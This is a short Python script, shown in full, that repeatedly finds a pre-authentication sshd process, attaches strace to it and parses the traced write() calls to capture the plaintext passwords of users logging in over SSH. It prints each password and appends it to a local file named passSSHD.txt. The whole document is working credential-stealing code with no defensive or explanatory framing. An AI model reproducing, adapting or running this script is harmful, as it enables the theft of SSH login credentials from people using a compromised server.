import sys
import os
import re
import time

while True:
    pid=0
    x=os.popen("ps -ef | grep sshd | grep -v grep").read()
    split_x=x.split("\n")
    for i in range (len(split_x)):
        if "[net]" in split_x[i]:
            split_x1=split_x[i].split(" ")
            for j in range(len(split_x1)):
                if split_x1[j].isnumeric():
                    pid=split_x1[j]
                    break
            break
    if pid != 0:
        print("[+] PID of sshd: "+pid)
        os.popen("strace -p "+pid +" -o strace1.txt").read()
        password=""
        output=list(open("strace1.txt"))
        for i in range (len(output)): 
            if "write(" in output[i] and "\\0\\0\\0" in output[i] and i>2:
                password=output[i].split("\\")[4].split("\"")[0]
        print("[+] Password: "+password[1:])
        if password != "":
            file=open("passSSHD.txt", "a")
            file.write(password[1:]+"\n")
            file.close()
